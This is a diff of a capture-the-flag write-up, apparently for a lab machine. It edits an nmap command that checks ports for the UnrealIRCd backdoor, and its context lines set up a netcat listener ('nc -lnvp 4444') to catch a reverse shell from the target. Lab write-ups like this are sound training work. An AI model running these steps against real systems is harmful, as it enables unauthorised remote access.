@@ -52,12 +52,12 @@ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 
 + First, run an nmap scan to determine which of these ports are vulnerable to the backdoor.
 ```
-nmap -d -p 6697,8067,65534 --script irc-unrealircd-backdoor 10.10.10.117
+nmap -p 6697,8067,65534 --script=irc-unrealircd-backdoor 10.10.10.117
 ```
 
 + Port 8067 is vulnerable.
 
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a12d7208-05bb-4714-b634-238d41c5519a)
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bca03c40-0895-4f7f-b1d9-aeb4c1d0711d)
 
 + Start a netcat listener on the attack machine: `nc -lnvp 4444`
 + Try to send a reverse shell to the attack machine netcat listener from the target machine.
